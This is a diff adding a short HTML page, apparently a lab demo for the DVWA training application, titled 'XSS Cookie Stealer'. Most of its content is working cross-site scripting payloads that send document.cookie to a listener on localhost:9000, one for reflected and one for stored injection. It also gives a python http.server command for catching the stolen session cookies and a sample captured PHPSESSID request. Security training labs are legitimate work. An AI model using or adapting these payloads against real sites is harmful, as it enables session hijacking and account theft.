@@ -1,0 +1,20 @@
+<html>
+<head><title>XSS Cookie Stealer Demo</title></head>
+<body>
+<h1>XSS Cookie Stealer</h1>
+<p>This page demonstrates how stolen cookies would be received.</p>
+
+<h2>Payload to inject in DVWA:</h2>
+<code>&lt;script&gt;new Image().src="http://localhost:9000/steal.php?c="+document.cookie&lt;/script&gt;</code>
+
+<h2>For Stored XSS (name field):</h2>
+<code>&lt;script&gt;fetch('http://localhost:9000/log?'+document.cookie)&lt;/script&gt;</code>
+
+<h2>Captured cookies will appear in server logs:</h2>
+<pre>
+Check: python3 -m http.server 9000
+Look for requests like: GET /steal.php?c=PHPSESSID=xxx;security=low
+</pre>
+
+</body>
+</html>
